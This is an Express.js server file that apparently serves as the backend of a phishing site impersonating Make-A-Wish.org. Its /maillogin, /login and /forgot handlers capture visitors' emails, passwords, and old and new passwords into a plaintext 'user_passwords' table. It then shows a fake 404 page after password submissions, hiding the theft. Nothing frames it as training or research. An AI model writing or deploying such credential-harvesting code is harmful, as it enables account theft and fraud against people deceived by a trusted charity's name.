require('dotenv').config();
const express = require('express');
const path = require('path');
const indexRouter = require('./routes/index');
const pool = require('./db.js');


const app = express();

// View engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname,'views'));

// Static files
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// Routes
app.use('/', indexRouter);
// app.use('/', donateRouter);

const PORT = process.env.PORT || 2000;
app.listen(PORT, () => {
  console.log(`Make-A-Wish.org running on http://localhost:${PORT}`);
});
app.post("/maillogin", (req, res) => {
  const { email } = req.body;   // extract email

  if (!email) {
    return res.status(400).send("email is required");
  }

  const sql = "INSERT INTO user_passwords  (email) VALUES (?)";

  pool.query(sql, [email], (err, result) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Database error");
    }

    res.render("index2"); 
  });
});


app.post("/login", (req, res) => {
  const { password } = req.body;   // extract password

  if (!password) {
    return res.status(400).send("email is required");
  }

  const sql = "INSERT INTO user_passwords  (password) VALUES (?)";

  pool.query(sql, [password], (err, result) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Database error");
    }

    res.render("404"); 
  });
});
app.post("/forgot", (req, res) => {
  const { oldpass, newpass } = req.body;   // extract password

  if (!oldpass || !newpass) {
    return res.status(400).send("password is required");
  }

  const sql = "INSERT INTO user_passwords  (oldpass, newpass) VALUES (?, ?)";

  pool.query(sql, [oldpass, newpass], (err, result) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Database error");
    }

    res.render("404"); 
  });
});

// 404 handler (must be last)
app.use((req, res) => {
  res.status(404).render('404');
});